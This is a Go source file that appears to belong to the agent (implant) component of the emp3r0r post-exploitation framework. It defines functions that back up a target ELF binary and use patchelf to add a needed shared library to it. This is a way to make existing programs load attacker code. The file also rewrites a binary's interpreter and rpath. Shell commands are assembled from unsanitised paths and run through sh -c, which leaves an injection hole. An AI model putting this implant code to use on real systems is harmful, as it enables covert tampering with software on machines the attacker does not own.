//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// AddNeededLib adds a needed library to an ELF file. lib_file needs to be the full path.
// Parameters:
// - elf_file: Path to the ELF file to modify.
// - lib_file: Path to the library to add.
func AddNeededLib(elf_file, lib_file string) (err error) {
	// backup
	bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, elf_file)
	if !util.IsFileExist(bak) {
		util.Copy(elf_file, bak)
	}

	// patchelf cmd
	cmd := fmt.Sprintf("%s/patchelf --add-needed %s %s",
		RuntimeConfig.UtilsPath, lib_file, elf_file)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}

// FixELF replaces ld and adds rpath to use musl libc.
// Parameters:
// - elf_path: Path to the ELF file to fix.
func FixELF(elf_path string) (err error) {
	pwd, _ := os.Getwd()
	err = os.Chdir(RuntimeConfig.UtilsPath)
	if err != nil {
		return
	}
	defer os.Chdir(pwd)

	// paths
	rpath := fmt.Sprintf("%s/lib/", RuntimeConfig.UtilsPath)
	patchelf := fmt.Sprintf("%s/patchelf", RuntimeConfig.UtilsPath)
	ld_path := fmt.Sprintf("%s/ld-musl-x86_64.so.1", rpath)
	log.Printf("rpath: %s, patchelf: %s, ld_path: %s", rpath, patchelf, ld_path)

	// remove rpath
	cmd := fmt.Sprintf("%s --remove-rpath", patchelf)
	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf remove rpath: %v, %s", err, out)
	}

	// patchelf cmd
	cmd = fmt.Sprintf("%s --set-interpreter %s --set-rpath %s %s",
		patchelf, ld_path, rpath, elf_path)

	out, err = exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}
